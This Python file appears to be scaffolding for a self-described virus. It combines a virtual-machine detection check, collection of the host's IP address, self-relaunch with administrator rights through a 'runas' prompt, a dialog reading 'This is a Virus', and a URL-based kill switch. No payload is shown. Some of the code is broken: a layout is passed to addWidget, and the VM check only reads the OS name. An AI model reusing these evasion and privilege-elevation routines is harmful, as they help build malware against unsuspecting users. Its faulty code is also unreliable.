import requests
import socket
from PyQt5.QtWidgets import QApplication, QWidget, QPushButton, QVBoxLayout, QLabel, QHBoxLayout
import platform
import ctypes
import sys

def VMCheck():
    system_info = platform.system().lower()
    
    vm_strings = ['vmware', 'virtual', 'hypervisor', 'xen']
    for vm_string in vm_strings:
        if vm_string in system_info:
            return True
    
    return False

def GetIP():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    return IPAddr

def GetAdmin():
    try:
        isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
    except AttributeError:
        isAdmin = False
    if not isAdmin:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

def InfoText():    
    app = QApplication(sys.argv)
    window = QWidget()

    AskLable = QLabel("Click 'OK' to proceed or 'Exit' to close the application.", window)        
    InfoLable = QLabel("This is a Virus", window)

    ExitButton = QPushButton('Exit', window)
    OkButton = QPushButton('Ok', window)

    ExitButton.clicked.connect(lambda: Exit())
    OkButton.clicked.connect(lambda: Ok())

    BoxLayout = QHBoxLayout(window)
    BoxLayout.addWidget(ExitButton)
    BoxLayout.addWidget(OkButton)
    
    Layout = QVBoxLayout(window)
    Layout.addWidget(InfoLable)
    Layout.addWidget(AskLable)
    Layout.addWidget(BoxLayout)

    window.setLayout(Layout)

    window.setWindowTitle('InfoText')
    window.show()

    def Exit():
        exit()
    
    def Ok():
        pass
        window.hide()

    sys.exit(app.exec_())

def KillSwitch(KillSwitchURL):
    try:
        response = requests.get(KillSwitchURL)
        response.raise_for_status()
        exit()
    except requests.exceptions.RequestException:
        pass